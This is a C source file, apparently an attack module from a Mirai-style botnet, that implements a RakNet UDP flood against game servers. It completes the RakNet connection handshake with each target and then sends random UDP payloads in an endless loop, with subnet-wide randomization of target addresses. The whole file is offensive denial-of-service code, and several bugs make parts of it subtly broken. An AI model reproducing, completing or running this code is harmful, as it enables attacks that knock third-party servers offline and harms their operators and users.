#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <errno.h>
#include <fcntl.h>

#include "../../attack.h"

// packet ids
#define OPEN_CONNECTION_REQUEST_1 0x05
#define OPEN_CONNECTION_REPLY_1 0x06
#define OPEN_CONNECTION_REQUEST_2 0x07
#define OPEN_CONNECTION_REQUEST 0x09
#define PROTOCOL_VERSION 0x0A

uint64_t random_uuid()
{
    unsigned char randomBytes[16];
    for (size_t i = 0; i < 16; ++i)
    {
        randomBytes[i] = rand() % 256;
    }

    randomBytes[6] &= 0x0f; // clear version
    randomBytes[6] |= 0x40; // set to version 4
    randomBytes[8] &= 0x3f; // clear variant
    randomBytes[8] |= 0x80; // set to IETF variant

    uint64_t random_uid = 0;
    _memcpy(&random_uid, randomBytes, sizeof(uint64_t));

    return random_uid;
}

// raknet_addr converts the a sockaddr_in to a raknet address used in the second packet
void raknet_addr(const struct sockaddr_in *sockaddr, uint32_t *result)
{
    if (sockaddr == NULL || result == NULL)
    {
        return;
    }

    uint32_t address = ntohl(sockaddr->sin_addr.s_addr);
    result[0] = 255 - (address >> 24) & 0xFF;
    result[1] = 255 - (address >> 16) & 0xFF;
    result[2] = 255 - (address >> 8) & 0xFF;
    result[3] = 255 - address & 0xFF;

    result[4] = htons(sockaddr->sin_port) >> 8;
    result[5] = htons(sockaddr->sin_port);
}

void flood_raknet(struct flood *flood)
{
    struct sockaddr_in bind_addr = {0};

    int i = 0;
    int *fd = calloc(flood->num_of_targets, sizeof(int));
    debug("skid\r\n");

    // Randomize source port
    if (flood->settings->source_port == 0xffff)
        flood->settings->source_port = rand_next();

    for (i = 0; i < flood->num_of_targets; i++)
    {
        struct flood_target target = flood->targets[i];

        struct iphdr *ip_header;
        struct udphdr *udp_header;

        // Randomize destination port
        if (flood->settings->dest_port == 0xffff)
            target.sock_addr.sin_port = rand_next();

        target.sock_addr.sin_port = htons(flood->settings->dest_port);

        // Create datagram socket.
        if ((fd[i] = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
            return;

        // Bind a local server for the source port.
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = flood->settings->source_port;
        bind_addr.sin_addr.s_addr = 0;
        bind(fd[i], (struct sockaddr *)&bind_addr, sizeof(struct sockaddr_in));

        // Randomize destination address if the netmask is below 32 to add subnet support.
        if (target.netmask < 32)
            target.sock_addr.sin_addr.s_addr = htonl(ntohl(target.addr) + (((uint32_t)rand_next()) >> target.netmask));

        uint32_t addr_raknet[4];
        uint64_t random_uid = random_uuid();
        raknet_addr(&target.sock_addr, addr_raknet);

        /**
         * Packet Content of a "Open Connection Request 1":
         *  ~ Packet ID
         *  ~ Magic
         *  ~ Protocol Version (10/11)
         *  ~ MTU (We'll edit this later on)
         */
        uint8_t open_connection_request_1[] = {
            OPEN_CONNECTION_REQUEST_1,
            0x00, 0xFF, 0xFF, 0x00,
            0xFE, 0xFE, 0xFE, 0xFE,
            0xFD, 0xFD, 0xFD, 0xFD,
            0x12, 0x34, 0x56, 0x78,
            PROTOCOL_VERSION,
            0x00, 0x00, 0x00};

        // Calculate the MTU
        uint16_t mtu = sizeof(open_connection_request_1) + 20 + 1 + 16 + 1 + 8;
        open_connection_request_1[18] = (mtu >> 8) & 0xFF;
        open_connection_request_1[19] = mtu & 0xFF;

        // Send "Open Connection Request 1" to the server
        sendto(fd[i], open_connection_request_1, sizeof(open_connection_request_1), 0, (struct sockaddr *)&target.sock_addr, sizeof(target.sock_addr));

        // We need to wait until we retrieve "Open Connection Reply 1"
        uint8_t buffer[32];
        while (1)
        {
            struct sockaddr_in sender_addr;
            socklen_t sender_len = sizeof(sender_addr);
            ssize_t bytes_received = recvfrom(fd[i], buffer, sizeof(buffer), 0, (struct sockaddr *)&sender_addr, &sender_len);
            if (bytes_received == -1)
                continue;

            if (buffer[0] == OPEN_CONNECTION_REPLY_1)
                break;

            exit(0);
        }

        /**
         * Packet Content of a "Open Connection Request 2":
         *  ~ Packet ID
         *  ~ Magic
         *  ~ Address type
         *  ~ Server address
         *  ~ Server port
         *  ~ MTU (We'll edit this later on)
         *  ~ Randomized UID
         */
        uint8_t open_connection_request_2[] = {
            OPEN_CONNECTION_REQUEST_2,
            0x00, 0xFF, 0xFF, 0x00,
            0xFE, 0xFE, 0xFE, 0xFE,
            0xFD, 0xFD, 0xFD, 0xFD,
            0x12, 0x34, 0x56, 0x78,
            0x04,
            addr_raknet[0], addr_raknet[1], addr_raknet[2], addr_raknet[3],
            addr_raknet[4], addr_raknet[5],
            0x00, 0x00, 0x00,
            (uint8_t)(random_uid >> 56), (uint8_t)(random_uid >> 48), (uint8_t)(random_uid >> 40), (uint8_t)(random_uid >> 32),
            (uint8_t)(random_uid >> 24), (uint8_t)(random_uid >> 16), (uint8_t)(random_uid >> 8), (uint8_t)random_uid};

        // Calculate MTU
        mtu = sizeof(open_connection_request_2) + 20 + 1 + 16 + 1 + 8 + 400;
        open_connection_request_2[24] = (mtu >> 8) & 0xFF;
        open_connection_request_2[25] = mtu & 0xFF;

        // Send packet to server
        sendto(fd[i], open_connection_request_2, sizeof(open_connection_request_2), 0, (struct sockaddr *)&target.sock_addr, sizeof(target.sock_addr));

        // Wait until we receive a "Open Connection Reply 2"
        _memset(buffer, 0, sizeof(uint8_t[32]));
        while (1)
        {
            struct sockaddr_in sender_addr;
            socklen_t sender_len = sizeof(sender_addr);
            ssize_t bytes_received = recvfrom(fd[i], buffer, sizeof(buffer), 0, (struct sockaddr *)&sender_addr, &sender_len);
            if (bytes_received == -1)
                continue;
            if (buffer[0] == 0x08)
                break;

            exit(0);
        }

        // Random data
        if (!flood->settings->random_data && flood->settings->payload == NULL)
        {
            flood->settings->payload = (char *)malloc(flood->settings->length);
            rand_str(flood->settings->payload, flood->settings->length);
        }
    }

    // Start sending traffic.
    while (1)
    {
        for (i = 0; i < flood->num_of_targets; i++)
        {
            struct flood_target target = flood->targets[i];

            // Randomize destination address if the netmask is below 32 to add subnet support
            if (target.netmask < 32)
                target.sock_addr.sin_addr.s_addr = htonl(ntohl(target.addr) + (((uint32_t)rand_next()) >> target.netmask));

            // Randomize payload when data randomization is turned on
            if (flood->settings->random_data)
            {
                if (flood->settings->min_length > 0 && flood->settings->max_length > 0)
                    flood->settings->length = rand_next_range(flood->settings->min_length, flood->settings->max_length);

                flood->settings->payload = (char *)malloc(flood->settings->length);
                rand_str(flood->settings->payload, flood->settings->length);
            }

            sendto(fd[i], flood->settings->payload, sizeof(flood->settings->payload), 0, (struct sockaddr *)&target.addr, sizeof(target.addr));

            if (flood->settings->payload != NULL && _strlen(flood->settings->payload) > 0)
            {
                free(flood->settings->payload);
            }
        }
    }
}
